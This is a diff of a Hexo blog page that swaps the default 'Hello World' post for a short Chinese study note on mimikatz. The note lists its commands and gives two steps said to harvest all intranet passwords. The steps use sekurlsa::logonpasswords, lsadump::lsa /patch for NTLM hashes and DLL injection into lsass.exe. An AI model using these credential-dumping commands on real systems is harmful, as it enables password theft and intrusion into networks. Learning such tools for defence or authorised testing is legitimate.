@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Hello World · Ywc&#39;s blog</title>
+    <title>mimikatz内网渗透 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Hello World</a>
+                <a href="#" class="post-name">mimikatz内网渗透</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Hello World
+            mimikatz内网渗透
             <!-- 404 -->
             
         </h1>
@@ -259,14 +259,20 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">74</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">310</span> / Reading time: <span class="post-count">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/20</span>
+                    <span class="post-intro-time">2018/06/14</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -390,23 +396,21 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h1 id="mimikatz常用命令"><a href="#mimikatz常用命令" class="headerlink" title="mimikatz常用命令"></a>mimikatz常用命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system::user        //查看当前登录的用户</span><br><span class="line">process::list       //列出进程</span><br><span class="line">process::stop processname //结束进程（有些进程结束不了，即使权限够大）</span><br><span class="line">process::suspend  processname //暂停进程</span><br><span class="line">process::modules      //列出系统核心模块和其所在的物理路径</span><br><span class="line">service::list       //列出系统服务</span><br><span class="line">service::stop(start) service_name   //停止（开启）服务</span><br><span class="line">privilege::list   //列出系统权限列表</span><br><span class="line">privilege::debug   /提升权限 （执行这条命令得有足够的权限）</span><br><span class="line">nogpo::cmd       //打开cmd</span><br><span class="line">nogpo::regedit   //打开注册表</span><br><span class="line">ts::sessions     //显示当前回话</span><br><span class="line">ts::processes    //显示当前进程及其PID</span><br><span class="line">sekurlsa::logonpasswords   //获取当前在线用户的明文密码（需要高权限运行）</span><br><span class="line">lsadump::lsa /patch       //获取当前此计算机存在过用户的NTLMHASH</span><br><span class="line">inject::process lsass.exe &apos;路径&apos; sekurlsa.dll //进程注入（如果用1.0版本获取hash的时候发现sekurlsa模块存在，就可以用进程注入一个dll文件，然后在获取hash）</span><br></pre></td></tr></table></figure>
+<h1 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h1><p>1.首先以管理员身份运行mimikatz.exe</p>
+<p>2.运行下面指令，即可得到当前内网中的所有密码。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug           //提升权限</span><br><span class="line">sekurlsa::logonpasswords   //抓取密码</span><br></pre></td></tr></table></figure></p>
+<p>参考链接：</p>
+<p><a href="http://www.cnblogs.com/pursuitofacm/p/6706841.html" target="_blank" rel="noopener">http://www.cnblogs.com/pursuitofacm/p/6706841.html</a></p>
+<p><a href="https://blog.csdn.net/pyphrb/article/details/52051321" target="_blank" rel="noopener">https://blog.csdn.net/pyphrb/article/details/52051321</a></p>
+<p><a href="http://blog.51cto.com/z2ppp/2060051" target="_blank" rel="noopener">http://blog.51cto.com/z2ppp/2060051</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://yoursite.com">John Doe</a>
-            <p>原文链接: <a href="http://yoursite.com/2018/07/20/hello-world/">http://yoursite.com/2018/07/20/hello-world/</a>
-            <p>发表日期: <a href="http://yoursite.com/2018/07/20/hello-world/">July 20th 2018, 4:29:31 pm</a>
+            <p>原文链接: <a href="http://yoursite.com/2018/06/14/mimikatz/">http://yoursite.com/2018/06/14/mimikatz/</a>
+            <p>发表日期: <a href="http://yoursite.com/2018/06/14/mimikatz/">June 14th 2018, 2:33:25 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -415,16 +419,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/21/blog/" title= 搭博客的经历 >
-                    <div class="nextTitle">搭博客的经历</div>
+                <a href= "/2018/07/02/iis文件解析漏洞/" title= iis文件解析漏洞 >
+                    <div class="nextTitle">iis文件解析漏洞</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/12/渗透基础/" title= 渗透基础 >
-                    <div class="prevTitle">渗透基础</div>
+                <a href= "/2018/06/13/luyoubiao/" title= 配置路由表 >
+                    <div class="prevTitle">配置路由表</div>
                 </a>
             
         </li>
@@ -536,7 +540,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mimikatz常用命令"><span class="toc-number">1.</span> <span class="toc-text">mimikatz常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用："><span class="toc-number">2.</span> <span class="toc-text">使用：</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
